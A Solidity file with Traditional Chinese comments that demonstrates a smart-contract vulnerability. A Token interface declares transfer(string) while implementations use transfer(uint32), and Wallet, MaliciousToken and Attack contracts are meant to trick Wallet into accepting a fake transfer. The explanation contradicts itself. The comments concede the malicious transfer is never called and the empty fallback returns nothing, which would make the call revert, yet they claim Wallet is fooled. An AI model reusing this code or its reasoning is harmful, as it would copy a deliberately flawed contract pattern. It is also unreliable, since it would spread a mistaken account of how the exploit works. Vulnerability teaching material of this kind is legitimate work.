pragma solidity >=0.8.0;

// 漏洞描述：
// 這個漏洞是參數型態不匹配問題，原本介面指定 transfer() 接受 string 型態參數，
// 但實作合約卻使用 uint32，使得在呼叫 Wallet.transfer 時，實際呼叫到的函式和預期的不符，
// 可能導致誤觸 fallback 函式或根本不呼叫正確的函式，從而繞過必要的檢查。

interface Token {
    // 漏洞重點：參數型態定義錯誤，使用 string 型態
    function transfer(string memory value) external returns (bool);
}

contract BadToken {
    // 漏洞重點：實作的 transfer() 使用了 uint32 型態，與介面不符
    function transfer(uint32 value) external returns (bool) {
        return true;
    }
}

contract Wallet {
    // 此函式試圖透過介面 Token 呼叫 transfer，但因為型態不匹配，實際上呼叫的函式選擇器不對
    function transfer(address token, uint32 value) external {
        // 為了讓編譯通過，必須將 uint32 轉為 string，但這並非使用者原意。
        // 這裡故意將數字轉成字串，展示因型態不匹配而導致錯誤呼叫的情形。
        require(Token(token).transfer(uint2str(value)), "Transfer failed");
    }
    
    // 將 uint 轉為 string 的輔助函式
    function uint2str(uint _i) internal pure returns (string memory str) {
        if (_i == 0) return "0";
        uint j = _i;
        uint len;
        while (j != 0) { len++; j /= 10; }
        bytes memory bstr = new bytes(len);
        uint k = len;
        while (_i != 0) {
            k = k - 1;
            uint8 temp = (48 + uint8(_i % 10));
            bstr[k] = bytes1(temp);
            _i /= 10;
        }
        str = string(bstr);
    }
}

// 攻擊合約說明：
// 攻擊者利用上述 Wallet 呼叫 Token.transfer 時的型態不匹配，部署一個惡意的 Token 合約
// 來欺騙 Wallet，讓 require 驗證錯誤地回傳 true，從而觸發錯誤或其他連鎖反應。

// 惡意 Token 合約：
contract MaliciousToken {
    // 此 fallback 用以接收任何未匹配到的函式呼叫，但在此案例中並不能返回數值，
    // 故額外實作一個 transfer 函式，其簽名與 BadToken 相同，但 Wallet 的呼叫會因型態不符而
    // 實際上呼叫不到這個函式。
    fallback() external payable { }
    
    // 攻擊者設計的 transfer()，保持回傳 true，但其參數型態與介面預期不符
    function transfer(uint32 _value) external pure returns (bool) {
        return true;
    }
}

// 攻擊流程測試合約：
// 1. 部署 Wallet 合約
// 2. 部署惡意合約 MaliciousToken，取得其地址
// 3. 攻擊者呼叫 Attack.executeAttack()，傳入惡意合約地址與數值，間接呼叫 Wallet.transfer
// 4. 因為介面與實作不符，Wallet 內的 require 驗證可能被錯誤處理，從而造成預期外的行為

contract Attack {
    Wallet public wallet;
    MaliciousToken public maliciousToken;
    
    constructor(Wallet _wallet) {
        wallet = _wallet;
        maliciousToken = new MaliciousToken();
    }
    
    // 攻擊入口：利用型態不匹配漏洞呼叫 Wallet.transfer 
    function executeAttack(uint32 value) public {
        // 傳入惡意合約的地址，使 Wallet 認定轉帳成功
        wallet.transfer(address(maliciousToken), value);
    }
}
